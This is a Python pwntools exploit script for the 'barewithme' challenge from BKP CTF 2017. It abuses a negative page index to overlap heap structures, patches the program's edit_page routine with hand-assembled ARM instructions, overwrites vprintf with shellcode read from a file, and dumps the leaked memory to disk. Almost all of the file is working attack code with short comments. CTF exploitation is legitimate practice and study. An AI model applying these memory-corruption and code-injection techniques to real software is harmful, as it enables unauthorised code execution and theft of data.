# This file exploits the barewithme challenge from BKP CTF 2017
from pwn import *
import re

context.log_level='debug'

p=process("../run.sh")
#p=remote("54.214.122.246", 8888)

p.readuntil("$")

def library_mode():
	p.writeline("library")
	p.readuntil('library')

def add_book(title, pages = None):
	p.writeline('add')
	p.readuntil(':')

	p.writeline(title)
	p.readuntil(':')

	num_pages = 0
	if pages != None:
		num_pages = len(pages)
	p.writeline('{}'.format(num_pages))

	if pages != None:
		for (font, content) in pages:
			p.writeline(font) # font
			p.writeline(content) # content

	p.readuntil('library')


# Add a book with 0 pages
library_mode()
add_book('A')

# Edit the book's 
p.writeline('edit')
p.readuntil(':')
p.writeline('0') # bookid

p.writeline('p') # edit page
p.readuntil(':')

p.writeline('-8372099') # page index to point back to the book list, thus cauisng the page we're editing to overlap the book
p.readuntil(':')

p.writeline('AAAA' + p32(0x44006a5)) # Font (overlaps with page count and first page pointer)
p.readuntil(':')
p.writeline('E') # content (overlaps with the book's title ptr)
p.writeline('E') #

# Edit the book's first page (which now points to 0x44006a5)

p.writeline('edit')
p.readuntil(':')
p.writeline('0') # bookid

p.writeline('p') # edit page
p.readuntil(':')

p.writeline('0') # page index
p.readuntil(':')

code = (
	chr(0x90) + chr(0xa0) + chr(0xe3) + # Complete with the 0x04 to do a: mov r9, #4 (for a nop)
	p32(0xe3a01a01)       + # mov r1, 0x1000
	p32(0x94FEFFEB)[::-1] + # call get_inputs
	p32(0x01DB8DE2)[::-1] + # ADD SP, SP, #400
	p32(0x7080BDE8)[::-1]   # LDMFD SP!, {R4-R6,PC}
)
p.writeline(code)
p.writeline('') # content
p.writeline('') # content

# Now we've changed the function edit_page to call get_input on a pointer we control for 0x1000 bytes
# We'll use that to change vprintf (0x4403e14)

p.readuntil("$")
p.writeline('edit')
p.readuntil(':')
p.writeline('0') # bookid

p.writeline('p') # edit page
p.readuntil(':')

p.writeline(str(0x4403e14)) # vprintf

# Get the shellcode
fd = open("shellcode", "rb")
shellcode = fd.read()
fd.close()
shellcode += ((0x1000 - len(shellcode)) / 4) * p32(0xeafffffe) # Pad with jumps to itself, so we can see where we're landing in gdb if we miss

# Once we return from edit_page, we'll print something, and vprintf will be called, causing our shellcode to run.
p.writeline(shellcode)

# Get the memory leaked by our shellcode
out = open("/tmp/leaked", "wb")
i = 0
while True:
	out.write(p.read(1))
	out.flush()
	i += 1
	if i > 0x100000:
		break
time.sleep(5)
out.close()

